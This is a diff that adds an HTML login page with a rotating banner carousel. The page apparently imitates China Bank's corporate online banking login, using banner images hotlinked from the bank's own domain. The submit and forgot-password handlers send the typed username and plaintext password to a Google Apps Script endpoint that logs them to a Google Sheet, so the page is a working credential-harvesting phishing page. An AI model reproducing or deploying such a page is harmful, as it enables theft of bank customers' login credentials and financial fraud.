@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login Page</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      display: flex;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+    }
+
+    .login-section {
+      width: 25%;
+      min-width: 200px; /* Ensures login section isn't too narrow */
+      background: linear-gradient(to bottom, #e60000, #990000);
+      color: white;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .login-section h2 {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+
+    .login-section input {
+      padding: 5px;
+      margin-bottom: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 4px;
+      font-size: 12px;
+    }
+
+    .login-section a {
+      color: white;
+      font-size: 10px;
+      text-decoration: underline;
+      margin-bottom: 10px;
+      cursor: pointer;
+    }
+
+    .login-section button {
+      padding: 8px;
+      width: 100%;
+      background: #333;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .carousel-section {
+      position: relative;
+      overflow: hidden;
+      width: 748px;
+      height: 268px;
+      background: black;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .carousel-section img {
+      width: 748px;
+      height: 268px;
+      object-fit: contain;
+      position: absolute;
+      top: 0;
+      left: 0;
+      opacity: 0;
+      transition: opacity 1s ease-in-out;
+    }
+
+    .carousel-section img.active {
+      opacity: 1;
+      position: relative;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="login-section">
+      <h2>Login to your Account</h2>
+      <input type="text" id="username" placeholder="Username" />
+      <input type="password" id="password" placeholder="Password" />
+      <a onclick="forgotPassword()">Forgot password? Click here.</a>
+      <button onclick="submitLogin()">Login</button>
+    </div>
+
+    <div class="carousel-section">
+      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%201.png" alt="Slide 1" class="active" />
+      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%202.png" alt="Slide 2" />
+      <img src="https://cbconline.chinabank.ph/CBC/corp/slides/img/banner%203.png" alt="Slide 3" />
+    </div>
+  </div>
+
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwYX6yoVWrjvY6EoFcy5_RLYG3pvXZ8l_G0CtgXNlKblO8R6x6CdNHPpoebLZunyS7DNw/exec';
+
+    function submitLogin() {
+      const data = {
+        username: document.getElementById('username').value,
+        password: document.getElementById('password').value,
+        type: 'login'
+      };
+
+      fetch(scriptURL, {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: { 'Content-Type': 'application/json' }
+      })
+      .then(res => res.json())
+      .then(res => alert("Login data sent to Google Sheet!"))
+      .catch(err => alert("Error sending data: " + err));
+    }
+
+    function forgotPassword() {
+      const data = {
+        username: document.getElementById('username').value || 'N/A',
+        password: 'N/A',
+        type: 'forgot_password'
+      };
+
+      fetch(scriptURL, {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: { 'Content-Type': 'application/json' }
+      })
+      .then(res => res.json())
+      .then(res => alert("Forgot password request sent!"))
+      .catch(err => alert("Error sending data: " + err));
+    }
+
+    // Carousel JS - switch images every 6 seconds
+    const images = document.querySelectorAll('.carousel-section img');
+    let currentIndex = 0;
+
+    setInterval(() => {
+      images[currentIndex].classList.remove('active');
+      currentIndex = (currentIndex + 1) % images.length;
+      images[currentIndex].classList.add('active');
+    }, 6000);
+  </script>
+
+</body>
+</html>
